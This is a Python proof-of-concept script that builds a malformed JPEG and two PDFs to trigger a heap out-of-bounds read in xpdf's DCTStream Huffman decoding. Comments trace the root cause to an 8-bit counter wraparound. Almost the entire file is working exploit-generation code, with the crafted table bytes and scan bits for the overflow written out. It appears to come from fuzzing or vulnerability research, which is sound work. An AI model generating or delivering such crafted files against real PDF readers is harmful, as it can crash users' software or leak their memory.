#!/usr/bin/env python3
"""
PoC generator for VULN-001:
DCTStream Heap OOB Read via Overflowed Huffman Symbol Count

Root cause:
  In DCTStream::readHuffmanTables() (Stream.cc ~4160), the local variable
  `sym` is Guchar (uint8). When BITS[15]=2 and BITS[16]=255, the accumulation
  sym = (Guchar)(2 + 255) = (Guchar)(257) wraps to 1. Only 1 HUFFVAL byte is
  read into sym[0], but numCodes[16]=255 and firstSym[16]=2.

  In DCTStream::readHuffSym() (Stream.cc ~3807), with codeBits=16 and code=258:
    code - firstCode[16] = 258 - 4 = 254 < numCodes[16]=255  -> triggers
    return sym[firstSym[16] + 254] = sym[2 + 254] = sym[256]  -> OOB READ!
  sym is Guchar[256], so index 256 is one past the end.

Scan data design (0x01 0x02 = bits 0000000100000010):
  Build code bit-by-bit (MSB first):
    bits 1-7  = 0 : code=0
    bit  8    = 1 : code=1
    bits 9-14 = 0 : code=2,4,8,16,32,64
    bit  15   = 1 : code=129 (129-firstCode[15]=0 -> 129 < 2? No)
    bit  16   = 0 : code=258 (258-firstCode[16]=4 -> 254 < 255? YES -> OOB)
"""

import os
import sys

OUTPUT_DIR = "/data/ylwang/non-textfuzz/target/_poc/xpdf/xpdf_Stream_cc"


def build_jpeg():
    """
    Build a malformed JPEG with DHT BITS=[0]*14+[2,255], HUFFVAL=[0x00].
    Scan data 0x01 0x02 produces a 16-bit code=258 which triggers sym[256] OOB.
    """
    data = bytearray()

    # SOI
    data += bytes([0xFF, 0xD8])

    # DQT: 8-bit quantization table #0, all coefficients=1
    qt_body = bytes([0x00]) + bytes([0x01] * 64)  # Pq/Tq=0 + 64 coefficients
    dqt_len = len(qt_body) + 2  # length field includes itself
    data += bytes([0xFF, 0xDB])
    data += dqt_len.to_bytes(2, 'big')
    data += qt_body

    # SOF0: 1x1 grayscale, 8-bit precision
    sof_body = bytes([
        0x08,        # Precision = 8
        0x00, 0x01,  # Height = 1
        0x00, 0x01,  # Width = 1
        0x01,        # Nf = 1 component
        0x01,        # C1 = component id 1
        0x11,        # H=1, V=1 sampling factors
        0x00,        # Tq = 0 (quantization table 0)
    ])
    sof_len = len(sof_body) + 2
    data += bytes([0xFF, 0xC0])
    data += sof_len.to_bytes(2, 'big')
    data += sof_body

    # DHT #1: crafted DC table (Tc=0, Th=0)
    # BITS[1..14] = 0 (no codes), BITS[15]=2, BITS[16]=255
    # sym accumulation: 0+0+...+2+255 = 257 -> wraps to 1 as Guchar
    # => only 1 HUFFVAL byte is read into sym[0]; sym[1..255] uninitialised.
    # firstCode[16]=4, firstSym[16]=2, numCodes[16]=255
    # scan data code=258 -> sym[2+254]=sym[256] OOB READ
    dc_bits = bytes([0x00] * 14 + [0x02, 0xFF])  # 16 bytes
    dc_huffval = bytes([0x00])                    # 1 byte (sym wraps to 1)
    dht_dc_body = bytes([0x00]) + dc_bits + dc_huffval  # Tc/Th=0, BITS, HUFFVAL
    dht_dc_len = len(dht_dc_body) + 2
    data += bytes([0xFF, 0xC4])
    data += dht_dc_len.to_bytes(2, 'big')
    data += dht_dc_body

    # DHT #2: minimal valid AC table (Tc=1, Th=0)
    # Required so that xpdf's numACHuffTables check passes.
    # Without this, xpdf returns early with "invalid Huffman table index"
    # before ever calling readHuffSym() on our crafted DC table.
    # One code of length 1: symbol 0x00 (EOB)
    ac_bits = bytes([0x01] + [0x00] * 15)  # 1 code at length 1, none at 2-16
    ac_huffval = bytes([0x00])              # EOB symbol
    dht_ac_body = bytes([0x10]) + ac_bits + ac_huffval  # Tc=1,Th=0 -> 0x10
    dht_ac_len = len(dht_ac_body) + 2
    data += bytes([0xFF, 0xC4])
    data += dht_ac_len.to_bytes(2, 'big')
    data += dht_ac_body

    # SOS: start of scan, 1 component using DC table 0
    sos_body = bytes([
        0x01,        # Ns = 1 component in scan
        0x01,        # Cs1 = component id 1
        0x00,        # Td=0 (DC table 0), Ta=0 (AC table 0)
        0x00,        # Ss = 0 (start of spectral selection)
        0x3F,        # Se = 63 (end of spectral selection)
        0x00,        # Ah=0, Al=0 (no successive approximation)
    ])
    sos_len = len(sos_body) + 2
    data += bytes([0xFF, 0xDA])
    data += sos_len.to_bytes(2, 'big')
    data += sos_body

    # Scan data:
    # 0x01 0x02 = 00000001 00000010 (16 bits, MSB first)
    # Bit-by-bit code accumulation:
    #   bits 1..7 (0s): code=0
    #   bit  8    (1):  code=1
    #   bit  9    (0):  code=2
    #   bit  10   (0):  code=4
    #   bit  11   (0):  code=8
    #   bit  12   (0):  code=16
    #   bit  13   (0):  code=32
    #   bit  14   (0):  code=64
    #   bit  15   (1):  code=129 -> check at len=15: 129-0=129 < 2? NO
    #   bit  16   (0):  code=258 -> check at len=16: 258-4=254 < 255? YES
    #                    -> sym[firstSym[16]+254] = sym[2+254] = sym[256] OOB!
    data += bytes([0x01, 0x02])

    # EOI
    data += bytes([0xFF, 0xD9])

    return bytes(data)


def build_pdf_xobject(jpeg_data):
    """
    Build a PDF with the malformed JPEG as an image XObject with /Filter /DCTDecode.
    pdftotext invokes Gfx::doImage() via the 'Do' operator; whether it actually
    reads the DCT stream depends on whether TextOutputDev skips image data.
    """
    jpeg_len = len(jpeg_data)
    content = b"q 100 0 0 100 0 0 cm /Im1 Do Q\n"

    # Object 1: Catalog
    obj1 = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"

    # Object 2: Pages tree
    obj2 = b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"

    # Object 3: Page
    obj3 = (
        b"3 0 obj\n"
        b"<< /Type /Page\n"
        b"   /Parent 2 0 R\n"
        b"   /MediaBox [0 0 100 100]\n"
        b"   /Contents 4 0 R\n"
        b"   /Resources << /XObject << /Im1 5 0 R >> >>\n"
        b">>\n"
        b"endobj\n"
    )

    # Object 4: Content stream
    obj4 = (
        b"4 0 obj\n"
        b"<< /Length " + str(len(content)).encode() + b" >>\n"
        b"stream\n" +
        content +
        b"endstream\nendobj\n"
    )

    # Object 5: Image XObject with DCTDecode
    img_header = (
        b"5 0 obj\n"
        b"<< /Type /XObject /Subtype /Image\n"
        b"   /Width 1\n"
        b"   /Height 1\n"
        b"   /ColorSpace /DeviceGray\n"
        b"   /BitsPerComponent 8\n"
        b"   /Filter /DCTDecode\n"
        b"   /Length " + str(jpeg_len).encode() + b"\n"
        b">>\n"
        b"stream\n"
    )
    img_footer = b"\nendstream\nendobj\n"
    obj5 = img_header + jpeg_data + img_footer

    # Assemble PDF body
    pdf = b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n"
    offsets = {}
    offsets[1] = len(pdf); pdf += obj1
    offsets[2] = len(pdf); pdf += obj2
    offsets[3] = len(pdf); pdf += obj3
    offsets[4] = len(pdf); pdf += obj4
    offsets[5] = len(pdf); pdf += obj5

    xref_offset = len(pdf)
    xref = b"xref\n0 6\n"
    xref += b"0000000000 65535 f \n"
    for i in range(1, 6):
        xref += "{:010d} 00000 n \n".format(offsets[i]).encode()

    pdf += xref
    pdf += (
        b"trailer\n<< /Size 6 /Root 1 0 R >>\n"
        b"startxref\n" + str(xref_offset).encode() + b"\n"
        b"%%EOF\n"
    )
    return pdf


def build_pdf_inline(jpeg_data):
    """
    Build a PDF with the malformed JPEG as an inline image (BI/ID/EI).
    The content stream parser must parse past the inline image data, which
    may trigger DCTStream decoding to find the stream boundary.
    """
    # Inline image operators: BI <dict> ID <raw-jpeg-bytes> EI
    content = (
        b"BI\n"
        b"/CS /G\n"
        b"/W 1\n"
        b"/H 1\n"
        b"/BPC 8\n"
        b"/F /DCT\n"
        b"ID\n" +
        jpeg_data +
        b"\nEI\n"
    )

    # Object 1: Catalog
    obj1 = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"

    # Object 2: Pages tree
    obj2 = b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"

    # Object 3: Page
    obj3 = (
        b"3 0 obj\n"
        b"<< /Type /Page\n"
        b"   /Parent 2 0 R\n"
        b"   /MediaBox [0 0 100 100]\n"
        b"   /Contents 4 0 R\n"
        b">>\n"
        b"endobj\n"
    )

    # Object 4: Content stream with inline image
    obj4 = (
        b"4 0 obj\n"
        b"<< /Length " + str(len(content)).encode() + b" >>\n"
        b"stream\n" +
        content +
        b"endstream\nendobj\n"
    )

    # Assemble PDF
    pdf = b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n"
    offsets = {}
    offsets[1] = len(pdf); pdf += obj1
    offsets[2] = len(pdf); pdf += obj2
    offsets[3] = len(pdf); pdf += obj3
    offsets[4] = len(pdf); pdf += obj4

    xref_offset = len(pdf)
    xref = b"xref\n0 5\n"
    xref += b"0000000000 65535 f \n"
    for i in range(1, 5):
        xref += "{:010d} 00000 n \n".format(offsets[i]).encode()

    pdf += xref
    pdf += (
        b"trailer\n<< /Size 5 /Root 1 0 R >>\n"
        b"startxref\n" + str(xref_offset).encode() + b"\n"
        b"%%EOF\n"
    )
    return pdf


def main():
    os.makedirs(OUTPUT_DIR, exist_ok=True)

    jpeg = build_jpeg()
    print(f"[*] Built JPEG: {len(jpeg)} bytes")
    print(f"    JPEG hex: {jpeg.hex()}")

    # Debug: verify DHT DC parameters
    # Byte layout: SOI(2)+DQT(2+67)+SOF(2+11)+DHT_DC_marker(2)+DHT_DC_len(2)+Tc_Th(1) = 89
    # DHT DC BITS start at byte index 89
    dht_bits = list(jpeg[89:105])
    print(f"[*] DC DHT BITS[1..16]: {dht_bits}")
    assert dht_bits[14] == 2,   f"BITS[15] should be 2, got {dht_bits[14]}"
    assert dht_bits[15] == 255, f"BITS[16] should be 255, got {dht_bits[15]}"
    print("[*] DHT sanity checks passed")

    # Write raw JPEG
    jpeg_path = os.path.join(OUTPUT_DIR, "vuln_001.jpg")
    with open(jpeg_path, 'wb') as f:
        f.write(jpeg)
    print(f"[*] Wrote: {jpeg_path}")

    # Write PDF with XObject
    pdf1 = build_pdf_xobject(jpeg)
    pdf1_path = os.path.join(OUTPUT_DIR, "vuln_001.pdf")
    with open(pdf1_path, 'wb') as f:
        f.write(pdf1)
    print(f"[*] Wrote: {pdf1_path} ({len(pdf1)} bytes) [XObject approach]")

    # Write PDF with inline image
    pdf2 = build_pdf_inline(jpeg)
    pdf2_path = os.path.join(OUTPUT_DIR, "vuln_001b.pdf")
    with open(pdf2_path, 'wb') as f:
        f.write(pdf2)
    print(f"[*] Wrote: {pdf2_path} ({len(pdf2)} bytes) [Inline image approach]")


if __name__ == "__main__":
    main()
